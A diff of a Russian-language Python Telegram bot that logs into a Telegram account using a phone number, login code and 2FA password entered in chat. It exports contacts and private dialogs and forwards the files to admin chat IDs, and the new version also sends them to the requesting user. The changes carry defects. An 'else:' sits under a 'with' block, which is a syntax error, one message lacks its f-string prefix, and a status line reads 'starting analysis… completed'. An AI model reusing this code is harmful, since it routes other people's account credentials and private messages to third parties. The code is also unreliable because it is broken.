@@ -37,25 +37,34 @@ logging.basicConfig(level=logging.INFO)
 # Словарь для хранения состояния пользователя
 user_state = {}
 
-
-# Функция для отправки файлов
-async def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html', '_chat_messages.html', '_media_files.zip']
+async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
+    file_extensions = ['_contacts.xlsx', '_report.html']
+    now_utc = datetime.now(pytz.utc)
+    timezone = pytz.timezone('Europe/Moscow')
+    now_local = now_utc.astimezone(timezone)
+    now = now_local.strftime("%Y-%m-%d %H:%M:%S")
+    user_id=user_chat_id
+    user_name = ALLOWED_USERS[user_id]
     max_file_size = 49 * 1024 * 1024  # 49 MB в байтах
 
+    user_info_message = f"Дата и время выгрузки: {now} \nВыгрузка осуществлена: ({user_name}, {user_id}):"
+
+    # Отправка сообщения с информацией о пользователе админам
+    for admin_chat_id in admin_chat_ids:
+        await bot.send_message(admin_chat_id, user_info_message)
+
+    # Отправка файлов с информацией пользователю и админам
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
-        
+    
         for file_to_send in files_to_send:
-            if os.path.getsize(file_to_send) <= max_file_size:  # Проверка размера файла
-                for admin_chat_id in admin_chat_ids:
+            for chat_id in [user_chat_id] + admin_chat_ids:
+                if os.path.getsize(file_to_send) <= max_file_size:  # Проверка размера файла
                     with open(file_to_send, "rb") as file:
-                        await bot.send_document(admin_chat_id, file)
-                        #print(f"\033[92mФайл {file_to_send} отправлен.\033[0m\n")
+                        await bot.send_document(chat_id, file)
                 os.remove(file_to_send)
-            else:
-                await message.answer ('Файл {file_to_send} слишком большой и не будет отправлен. Обратитесь к администратору, чтобы его получить')
-
+                else:
+                    await bot.send_message (chat_id, 'Файл {file_to_send} слишком большой и не будет отправлен. Обратитесь к администратору, чтобы его получить')
 
 
 # Обработчики сообщений
@@ -82,6 +91,7 @@ async def analitic_command(message: types.Message):
         phone_number = user_state[user_id]['phone_number']
         client = user_state[user_id]['client']
         try:
+            await message.answer("Начинаю анализ данных завершен")
             await process_user_data(client, phone_number, user_id)
             await message.answer("Анализ данных завершен")
         except Exception as e:
@@ -135,17 +145,15 @@ async def get_private_message_from_list(message: types.Message):
     i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
     g_index = int(message.text.strip()) 
     selection = '40'
-    await message.answer('ваш выбор {g_index}')
     try:
         if 0 <= g_index < i:
             target_user = users_list[g_index]
+            await message.answer(f"начинаю выгрузку диалога под номеом: {g_index}. Дождись сообщение о завершении")
             await get_messages_for_html(client, target_user, selection)
+            await message.answer("Выгрузка завершена. Отправляю файлы")
             await send_files_to_bot(bot, admin_chat_ids, user_id)
     except ValueError:
-        await message.answer("Введите число от 0 до максимального индекса.")
-
-
-
+        await message.answer("Введите число, соотвествующее диалогу.")
 
 
 
@@ -204,10 +212,6 @@ async def get_phone_number(message: types.Message):
 
 
 # Введен пин-код
-#@dp.message_handler(lambda message: message.text and 
-                    #'phone_code_hash' in user_state.get(message.from_user.id, {}) and
-                    #'awaiting_password' not in user_state.get(message.from_user.id, {}))
-
 @dp.message_handler(lambda message: message.text and 
                     'phone_code_hash' in user_state.get(message.from_user.id, {}) and
                     'awaiting_password' not in user_state.get(message.from_user.id, {}) and not
@@ -223,7 +227,7 @@ async def get_code(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        await message.answer("Подключено! Теперь можно выбрать одну из опций")
+        await message.answer("Подключено! Выбери в меню бота одну из опций")
         user_state[user_id]['connected'] = True  # Обновляем состояние
         #await process_user_data(client, phone_number, message.from_user.id)
         #await client.log_out()
@@ -256,8 +260,6 @@ async def get_code(message: types.Message):
                 
                 
 #Введен пароль
-#@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
-
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}) and not
                     user_state.get(message.from_user.id, {}).get('connected', False))
 async def process_password(message: types.Message):
@@ -269,7 +271,7 @@ async def process_password(message: types.Message):
             await client.connect()
             await client.sign_in(password=password)
             user_state[user_id]['connected'] = True  # Обновляем состояние
-            await message.answer("Подключено! Теперь можно выбрать одну из опций")
+            await message.answer("Подключено! Выбери в меню бота одну из опций")
             phone_number = user_state[user_id]['phone_number']
             # await process_user_data(client, phone_number, user_id)
             # user_state.pop(user_id, None)  # Удаляем состояние пользователя после успешной обработки
